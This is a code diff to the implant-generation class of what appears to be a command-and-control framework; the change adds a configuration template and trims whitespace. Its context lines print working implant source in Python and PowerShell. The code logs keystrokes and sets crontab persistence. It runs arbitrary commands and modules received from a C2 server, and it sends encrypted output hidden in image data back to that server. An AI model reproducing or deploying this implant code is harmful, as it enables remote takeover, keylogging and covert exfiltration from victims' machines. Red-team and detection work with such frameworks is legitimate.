@@ -31,6 +31,13 @@ class Implant(object):
     self.ServerURL = new_serverurl = select_item("HostnameIP", "C2Server")
     self.AllBeaconURLs = get_otherbeaconurls()
     self.AllBeaconImages = get_images()
+    self.SharpCore = """
+RANDOMURI19901%s10991IRUMODNAR
+URLS10484390243%s34209348401SLRU
+KILLDATE1665%s5661ETADLLIK
+SLEEP98001%s10089PEELS
+NEWKEY8839394%s4939388YEKWEN
+IMGS19459394%s49395491SGMI""" % (self.RandomURI, self.AllBeaconURLs, self.KillDate, self.Sleep, self.Key, self.AllBeaconImages)
     with open("%spy_dropper.py" % (PayloadsDirectory), 'rb') as f:
         self.PythonImplant = base64.b64encode(f.read())
     self.PythonCore = """import urllib2, os, subprocess, re, datetime, time, base64, string, random
@@ -52,7 +59,7 @@ def keylog():
   exec(modpayload)
   pids = os.popen('ps aux | grep " ruby" | grep -v grep').read()
   returnval = "%%s \\r\\nKeylogger started here: %%s" %% (pids, filename)
-  return returnval  
+  return returnval
 
 def dfile(fname):
   if fname:
@@ -102,7 +109,7 @@ def persist():
 def remove_persist():
   import subprocess as s
   s.call("crontab -l | { cat;  } | grep -v '_psh.sh'| crontab -", shell=True)
-  return "Removed user persistence via crontab: \\r\\n**must delete files manually**" 
+  return "Removed user persistence via crontab: \\r\\n**must delete files manually**"
 
 def decrypt_bytes_gzip( key, data):
   iv = data[0:16]
@@ -146,23 +153,23 @@ while(True):
           for cmd in split:
             if cmd[:10] == "$sleeptime":
               timer = int(cmd.replace("$sleeptime = ",""))
-            elif cmd[:13] == "download-file":  
+            elif cmd[:13] == "download-file":
               fname = cmd.replace("download-file ","")
-              returnval = dfile(fname) 
-            elif cmd[:11] == "upload-file":  
+              returnval = dfile(fname)
+            elif cmd[:11] == "upload-file":
               fullparams = cmd.replace("upload-file ","")
               params = fullparams.split(":")
-              returnval = ufile(params[1],params[0]) 
-            elif cmd[:19] == "install-persistence":  
-              returnval = persist() 
-            elif cmd[:14] == "get-keystrokes":  
+              returnval = ufile(params[1],params[0])
+            elif cmd[:19] == "install-persistence":
+              returnval = persist()
+            elif cmd[:14] == "get-keystrokes":
               returnval = keylog()
-            elif cmd[:18] == "remove-persistence":  
-              returnval = remove_persist() 
-            elif cmd[:19] == "startanotherimplant":   
+            elif cmd[:18] == "remove-persistence":
+              returnval = remove_persist()
+            elif cmd[:19] == "startanotherimplant":
               returnval = sai(delfile=True)
             elif cmd[:28] == "startanotherimplant-keepfile":
-              returnval = sai()  
+              returnval = sai()
             elif cmd[:10] == "loadmodule":
               module = cmd.replace("loadmodule","")
               exec(module)
@@ -190,7 +197,7 @@ while(True):
                 returnval = "Error with source file: %%s" %% e
               
             elif cmd[:6] == "python":
-              module = cmd.replace("python ","")            
+              module = cmd.replace("python ","")
               try:
                 import sys
                 import StringIO
@@ -245,7 +252,7 @@ $payloadclear = @"
 function DEC {${function:DEC}}
 function ENC {${function:ENC}}
 function CAM {${function:CAM}}
-function Get-Webclient {${function:Get-Webclient}} 
+function Get-Webclient {${function:Get-Webclient}}
 function Primer {${function:primer}}
 `$primer = primer
 if (`$primer) {`$primer| iex} else {
@@ -272,14 +279,14 @@ function GetImgData($cmdoutput) {
     
     try {$image = $icoimage|get-random}catch{}
 
-    function randomgen 
+    function randomgen
     {
         param (
             [int]$Length
         )
         $set = "...................@..........................Tyscf".ToCharArray()
         $result = ""
-        for ($x = 0; $x -lt $Length; $x++) 
+        for ($x = 0; $x -lt $Length; $x++)
         {$result += $set | Get-Random}
         return $result
     }
@@ -289,7 +296,7 @@ function GetImgData($cmdoutput) {
     $imagebyteslen = $imageBytes.Length
     $paddingbyteslen = $maxbyteslen - $imagebyteslen
     $BytePadding = [System.Text.Encoding]::UTF8.GetBytes((randomgen $paddingbyteslen))
-    $ImageBytesFull = New-Object byte[] $maxdatalen    
+    $ImageBytesFull = New-Object byte[] $maxdatalen
     [System.Array]::Copy($imageBytes, 0, $ImageBytesFull, 0, $imageBytes.Length)
     [System.Array]::Copy($BytePadding, 0, $ImageBytesFull,$imageBytes.Length, $BytePadding.Length)
     [System.Array]::Copy($cmdoutput, 0, $ImageBytesFull,$imageBytes.Length+$BytePadding.Length, $cmdoutput.Length )
@@ -340,10 +347,10 @@ function Encrypt-Bytes($key, $bytes) {
   $gzipStream.Close()
   $bytes = $output.ToArray()
   $output.Close()
-  $aesManaged = Create-AesManagedObject $key 
-  $encryptor = $aesManaged.CreateEncryptor() 
+  $aesManaged = Create-AesManagedObject $key
+  $encryptor = $aesManaged.CreateEncryptor()
   $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
-  [byte[]] $fullData = $aesManaged.IV + $encryptedData 
+  [byte[]] $fullData = $aesManaged.IV + $encryptedData
   $fullData
 }
 function Decrypt-String($key, $encryptedStringWithIV) {
@@ -358,7 +365,7 @@ function Decrypt-String($key, $encryptedStringWithIV) {
 function Encrypt-String2($key, $unencryptedString) {
     $unencryptedBytes = [system.Text.Encoding]::UTF8.GetBytes($unencryptedString)
     $CompressedStream = New-Object IO.MemoryStream
-    $DeflateStream = New-Object System.IO.Compression.GzipStream $CompressedStream, ([IO.Compression.CompressionMode]::Compress)    
+    $DeflateStream = New-Object System.IO.Compression.GzipStream $CompressedStream, ([IO.Compression.CompressionMode]::Compress)
     $DeflateStream.Write($unencryptedBytes, 0, $unencryptedBytes.Length)
     $DeflateStream.Dispose()
     $bytes = $CompressedStream.ToArray()
@@ -393,7 +400,7 @@ while($true)
     if ($killdate -lt $date) {exit}
     $sleeptimeran = $sleeptime, ($sleeptime * 1.1), ($sleeptime * 0.9)
     $newsleep = $sleeptimeran|get-random
-    if ($newsleep -lt 1) {$newsleep = 5} 
+    if ($newsleep -lt 1) {$newsleep = 5}
     start-sleep $newsleep
     $URLS = %s
     $RandomURI = Get-Random $URLS
@@ -441,7 +448,7 @@ while($true)
                         } elseif ($i.ToLower().StartsWith("loadmodule")) {
                             try {
                                 $modulename = $i -replace "LoadModule",""
-                                $Output = Invoke-Expression $modulename | out-string  
+                                $Output = Invoke-Expression $modulename | out-string
                                 $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                                 $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
                                 $Output = Encrypt-String2 $key $Output
@@ -452,7 +459,7 @@ while($true)
                             }
                         } else {
                             try {
-                                $Output = Invoke-Expression $i | out-string  
+                                $Output = Invoke-Expression $i | out-string
                                 $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                                 $StdError = ($error[0] | Out-String)
                                 if ($StdError){
@@ -469,7 +476,7 @@ while($true)
                             (Get-Webclient -Cookie $Response).UploadData("$Server", $UploadBytes)|out-null
                             } catch{}
                         }
-                    } 
+                    }
             }
             elseif ($ReadCommandClear.ToLower().StartsWith("upload-file")) {
                 try {
@@ -494,7 +501,7 @@ while($true)
             } elseif ($ReadCommandClear.ToLower().StartsWith("loadmodule")) {
                 try {
                 $modulename = $ReadCommandClear -replace "LoadModule",""
-                $Output = Invoke-Expression $modulename | out-string  
+                $Output = Invoke-Expression $modulename | out-string
                 $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                 $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
                 $Output = Encrypt-String2 $key $Output
@@ -506,7 +513,7 @@ while($true)
 
             } else {
                 try {
-                    $Output = Invoke-Expression $ReadCommandClear | out-string  
+                    $Output = Invoke-Expression $ReadCommandClear | out-string
                     $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                     $StdError = ($error[0] | Out-String)
                     if ($StdError){
@@ -528,7 +535,7 @@ while($true)
     break
     }
 }""" % (self.Key, self.Sleep, self.AllBeaconImages, self.RandomURI, self.RandomURI, self.KillDate, self.AllBeaconURLs)
-#Add all db elements 
+#Add all db elements
 
   def display(self):
     print Colours.GREEN,""
@@ -551,7 +558,7 @@ while($true)
         engine.say("Nice, we have an implant")
         engine.runAndWait()
     except Exception as e:
-      EspeakError = "espeak error"      
+      EspeakError = "espeak error"
 
     try:
       apikey = select_item("APIKEY","C2Server")
